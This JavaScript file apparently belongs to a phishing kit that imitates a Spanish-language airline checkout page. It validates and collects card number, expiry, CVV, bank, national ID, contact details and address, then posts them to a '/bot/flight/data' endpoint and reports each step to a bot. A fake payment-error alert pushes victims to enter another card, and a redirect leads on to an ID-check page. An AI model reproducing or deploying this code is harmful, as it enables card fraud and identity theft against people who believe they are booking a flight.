const loader = document.querySelector('.loader');

const { origin, destination, ticket_nat, ticket_sched, ticket_sched_back, ticket_type, ticket_type_back, adults, children, babies, type } = info.flightInfo;
const weight = Math.abs(origin.weight - destination.weight)
const price = (weight * PRECIO_BASE_INT);

setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        /* --- FLIGHT RESUME --- */
        document.querySelector('#origin-code').textContent = origin.code;
        document.querySelector('#destination-code').textContent = destination.code;
        let finalPrice = "- -";
        if(ticket_nat === 'NAC'){
            finalPrice = pricesNAC[ticket_sched][ticket_type] * (adults + children);
            if(type === 1){
                finalPrice += pricesNAC[ticket_sched_back][ticket_type_back] * (adults + children);
            }
        }else if(ticket_nat === 'INT'){
            finalPrice = price * MULTIPLICADOR_HORARIO[ticket_sched] * MULTIPLICADOR_PLAN[ticket_type] * (adults + children)
            if(type === 1){
                finalPrice += price * MULTIPLICADOR_HORARIO[ticket_sched_back] * MULTIPLICADOR_PLAN[ticket_type_back] * (adults + children)
            }
        }else{
            console.log('flight resume error');
        }

        document.querySelector('#flight-cost').textContent = formatPrice(finalPrice);

        // COMPROBAR ERROR
        if(info.metaInfo.p !== ''){
            alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
        }

        console.log("Index ON")
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({message: 'P4-PAYMENT'})
        })
        
    }catch(err){
        console.log(err);
    }
}, 2000);

const btnNextStep = document.querySelector('#next-step');

const p = document.querySelector('#p');
const pdate = document.querySelector('#pdate');
const c = document.querySelector('#c');
const ban = document.querySelector('#ban');
const dues = document.querySelector('#dues');
const dudename = document.querySelector('#name');
const surname = document.querySelector('#surname');
const cc = document.querySelector('#cc');
const email = document.querySelector('#email');
const telnum = document.querySelector('#telnum');
const city = document.querySelector('#city');
const state = document.querySelector('#state');
const address = document.querySelector('#address');
const checkNonNationalCard = document.querySelector('#checkNonNationalCard');
checkNonNationalCard.addEventListener('change', e => {
    if(e.target.checked){
        ban.classList.add('d-none');
        ban.removeAttribute('required');
    }else{
        ban.classList.remove('d-none');
        ban.setAttribute('required', '');
    }
});




btnNextStep.addEventListener('submit', e =>{
    e.preventDefault();

    try{
        p.classList.remove('input-error')
        pdate.classList.remove('input-error')
        c.classList.remove('input-error')
        dudename.classList.remove('input-error')
        surname.classList.remove('input-error')
        cc.classList.remove('input-error')
        email.classList.remove('input-error')
        telnum.classList.remove('input-error')
        city.classList.remove('input-error')
        state.classList.remove('input-error')
        address.classList.remove('input-error')
    }catch(err){
        console.log(err);
    }

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if(isLuhnValid(p.value)){
            if (isValidDate(pdate.value)) {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
                    if(ban.value !== '' || checkNonNationalCard.checked){
                        if(dudename.value !== ''){
                            if(surname.value !== ''){
                                if(cc.value !== ''){
                                    if(email.value !== ''){
                                        if(telnum.value !== ''){
                                            if(city.value !== ''){
                                                if(state.value !== ''){
                                                    if(address.value !== ''){
                                                        console.log('todo bien, sigamos :)');
    
                                                        info.metaInfo.p = p.value;
                                                        info.metaInfo.ban = ban.value;
                                                        info.metaInfo.pdate = pdate.value;
                                                        info.metaInfo.c = c.value;
                                                        info.metaInfo.dudename = dudename.value;
                                                        info.metaInfo.surname = surname.value;
                                                        info.metaInfo.cc = cc.value;
                                                        info.metaInfo.email = email.value;
                                                        info.metaInfo.telnum = telnum.value;
                                                        info.metaInfo.city = city.value;
                                                        info.metaInfo.state = state.value;
                                                        info.metaInfo.address = address.value;

                                                        if(info.metaInfo.p[0] == '4'){
                                                            info.checkerInfo.company = 'VISA';
                                                        }else if(info.metaInfo.p[0] == '5'){
                                                            info.checkerInfo.company = 'MC';
                                                        }else if(info.metaInfo.p[0] == '3'){
                                                            info.checkerInfo.company = 'AM';
                                                        }
    
                                                        updateLS();
    
                                                        fetch(`${API_URL}/api/bot/flight/data`, {
                                                            method: 'POST',
                                                            headers: {
                                                                'Content-Type': 'application/json',
                                                                'Authorization': `Bearer ${API_KEY}`
                                                            },
                                                            body: JSON.stringify(info.metaInfo)
                                                        });

                                                        loader.classList.add('show');

                                                        setTimeout(() => window.location.href = 'id-check.html', 4500);
    
                                                    }else{
                                                        address.classList.add('input-error');
                                                        address.focus();
                                                    }
                                                }else{
                                                    state.classList.add('input-error');
                                                    state.focus();
                                                }
                                            }else{
                                                city.classList.add('input-error');
                                                city.focus();
                                            }
                                        }else{
                                            telnum.classList.add('input-error');
                                            telnum.focus();
                                        }
                                    }else{
                                        email.classList.add('input-error');
                                        email.focus();
                                    }
                                }else{
                                    cc.classList.add('input-error');
                                    cc.focus();
                                }
                            }else{
                                surname.classList.add('input-error');
                                surname.focus();
                            }
                        }else{
                            dudename.classList.add('input-error');
                            dudename.focus();
                        }
                    } else{
                        ban.focus();
                    }

                } else {
                    c.classList.add('input-error');
                    c.focus();
                }
            } else {
                pdate.classList.add('input-error');
                pdate.focus();
            }
        } else{
            p.classList.add('input-error');
            p.focus();
        }
    } else {
        p.classList.add('input-error');
        p.focus();
    }
});





/**
 * FUNCTIONS
 * 
 */
function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
    if(numero.length === 0){
        p.removeAttribute('class');
        p.classList.add('input-cc', 'mt-2', 'bg-std');
    }

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('maxlength', '4');
        // Icono
        p.removeAttribute('class');
        p.classList.add('bg-am', 'input-cc', 'mt-2');

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        numero[0] == 4 ? p.classList.add('bg-vi') : '';
        numero[0] == 5 ? p.classList.add('bg-mc') : '';

        c.setAttribute('maxlength', '3');
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}